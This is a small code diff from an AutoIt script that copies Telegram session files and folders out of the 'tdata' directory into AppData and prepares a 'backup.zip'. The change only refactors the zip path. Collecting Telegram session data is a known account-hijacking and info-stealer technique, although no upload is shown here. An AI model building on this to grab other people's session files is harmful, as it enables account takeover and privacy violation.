@@ -113,7 +113,7 @@ $aSessionFiles = GetTelegramSessionFiles(getTelegramDir())
 $aSessionFolders = GetTelegramSessionFolders(getTelegramDir())
 $tData = getTelegramDir() & "\tdata\"
 $outputPath = @AppDataDir & "\telegram\"
-$zipFilePath = @AppDataDir & '\telegram\backup.zip'
+$zipFilePath = $outputPath & 'backup.zip'
 
 CopyArrayFiles($tData, $aSessionFiles, $outputPath)
 CopyArrayFolders($tData, $aSessionFolders, $outputPath)
